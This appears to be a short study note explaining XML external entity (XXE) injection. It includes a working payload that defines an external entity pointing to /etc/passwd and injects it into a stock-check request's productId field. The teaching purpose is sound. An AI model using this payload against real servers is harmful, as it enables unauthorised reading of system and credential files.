XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. 
It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

> XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared
> External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL.

#### Exploiting XXE to retrieve files
To perform an XXE injection attack
1. Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
2. Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.
````
General request:
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>

Performing XXE attack to retrive "/etc/passwd" file from the system by the following command:-
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
````
